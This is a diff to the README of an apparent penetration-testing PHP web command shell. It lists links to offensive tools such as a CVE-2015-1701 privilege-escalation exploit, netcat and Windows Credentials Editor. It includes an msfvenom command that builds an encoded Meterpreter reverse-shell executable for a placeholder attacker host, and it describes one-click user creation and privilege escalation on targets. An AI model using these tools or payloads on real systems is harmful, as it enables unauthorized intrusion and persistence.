@@ -5,20 +5,20 @@ PsTools: https://download.sysinternals.com/files/PSTools.zip <br>
 CVE-2015-1701 Priv Esc(aka Taihou.exe) https://github.com/hfiref0x/CVE-2015-1701<br>
 JAWs Enum: https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1<br>
 Netcat for windows: https://github.com/int0x33/nc.exe<br>
-Trend Micro Ransomware file Decryptor: <a href="https://powerbox-na-file.trend.org/SFDC/DownloadFile_iv.php?jsonInfo=%7B%22Query%22%3A%22dR%2BBrNMzg9JJ%2BWXagmE3CFGo6KHZSCtPVPWbg7058IWvcyqFByPzp7Z4BbItLT0NsFzkgJ0M94o3bXOPZnUaMn8BheublSy8lx4KW0qoVEoOa5y7oXGHz2cEAVug61PrxdNc4ubF%2F0%2Fo%2F28ETVpeohg%2F1LXEe9WTr%2B226RTY1Fy5cDIFi3jpKceg6BphKyMuDSbSXylWRKdYIpWKpjVQ8C57t%2BsE56nvuvo6MQmfekk4oRgyS03nH6MaTefGu4nx%22%2C%22iv%22%3A%2259e1f948abd6a90359e13f2b04fa37a5%22%7D" target="_blank"> here </a> 
-Windows Credentials Editor: https://gitlab.com/kalilinux/packages/wce
+Trend Micro Ransomware file Decryptor: <a href="https://powerbox-na-file.trend.org/SFDC/DownloadFile_iv.php?jsonInfo=%7B%22Query%22%3A%22dR%2BBrNMzg9JJ%2BWXagmE3CFGo6KHZSCtPVPWbg7058IWvcyqFByPzp7Z4BbItLT0NsFzkgJ0M94o3bXOPZnUaMn8BheublSy8lx4KW0qoVEoOa5y7oXGHz2cEAVug61PrxdNc4ubF%2F0%2Fo%2F28ETVpeohg%2F1LXEe9WTr%2B226RTY1Fy5cDIFi3jpKceg6BphKyMuDSbSXylWRKdYIpWKpjVQ8C57t%2BsE56nvuvo6MQmfekk4oRgyS03nH6MaTefGu4nx%22%2C%22iv%22%3A%2259e1f948abd6a90359e13f2b04fa37a5%22%7D" target="_blank"> here </a><br> 
+Windows Credentials Editor: https://gitlab.com/kalilinux/packages/wce (wce32,64, and universal)<br>
 DRW Ransomware Decryptor: https://download2.easeus.com/installer_rss_new.php<br>
 venom.exe : (sudo) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKBOXIP LPORT=ATTACBOXPORT -e x86/shikata_ga_nai -f exe -o venom.exe
 </p>
 
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif" />
-<h2>Automates or simplifies many on target enumeration functions. Specifically:</h2>
+<h2>Automates or simplifies many on target enumeration functions. Including:</h2>
 <ul>
 <li>Simple system commands</li>
 <li>File upload/download options</li>
-<li>One click preset user creation (on compatible targets)</li>
-<li>One click Priv Esc for preset user (on compatible targets)</li>
-<li>One click user info/ user perm info</li>
+<li>One click preset user creation (on compatible targets with sufficient privileges)</li>
+<li>One click Priv Esc for preset user (on compatible targets with sufficient privileges)</li>
+<li>One click user info/ user permissions info</li>
 <li>One click systeminfo</li>
 <li>One Click processes list</li>
 <li>And many more...</li>
